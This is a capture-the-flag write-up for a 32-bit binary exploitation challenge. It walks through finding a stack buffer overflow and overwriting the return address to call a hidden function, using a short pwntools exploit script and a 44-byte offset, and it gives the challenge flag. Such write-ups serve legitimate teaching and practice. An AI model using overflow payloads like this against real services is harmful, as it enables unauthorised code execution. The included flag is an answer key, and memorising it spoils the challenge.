# !Kogarashi Café - The First Visit  

**Category:** Binary Exploitation 

A simple binary exploitation challenge involving a buffer overflow to hijack execution flow.  

---

### Challenge  

**Provided File:** `first_visit`  

---

## Overview  

1. **Analyzing the Binary**  
   - Use `file first_visit` to determine the binary type:
   
     ```sh
     ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ddf24eef326cd1ee996fc66f78c48a6eab6d9b87, not stripped
     ```
   - Run `strings first_visit` to find readable text inside:
     ```sh
     Barista: 'Strange... the recipe is missing.
     ```
   - Disassemble the binary using `objdump`:
     ```sh
     objdump -d first_visit > disassembly.txt
     ```
   - Load the binary in **Ghidra** or **Binary Ninja** to reverse-engineer its logic.  

2. **Identifying the Vulnerability**  
   - The binary contains a **buffer overflow vulnerability**, allowing us to overwrite the return address.
   - The function `brew_coffee()` is present in the binary but not called directly.
   - Our goal is to overwrite the return address with the function’s address to execute it.  

---

## Steps to Exploit  

1. **Check Binary Properties**  
   ```sh
   file first_visit  
   checksec --file=first_visit  
   strings first_visit  
   ```

2. **Reverse Engineer the Binary**  
   - Load in **Ghidra** or **Binary Ninja** to analyze the functions.
   - Identify the address of `brew_coffee()` from the disassembly.  

3. **Exploit Buffer Overflow**  
   - Determine the correct buffer overflow offset (44 bytes).
   - Overwrite the return address with the address of `brew_coffee()` to gain control.  

---

## Exploit Script  

```python
from pwn import *

# Connect to the remote challenge
p = remote('chals1.apoorvctf.xyz', 3001)

# Determine the offset (e.g., 44 bytes) and use the correct address of brew_coffee()
offset = 44
brew_coffee_addr = p32(0x0804856b)  # Using the address from disassembly

payload = b'A' * offset + brew_coffee_addr

p.sendline(payload)
p.interactive()
```

---

## Extracted Flag  

```
apoorvctf{c0ffee_buff3r_sp1ll}
```
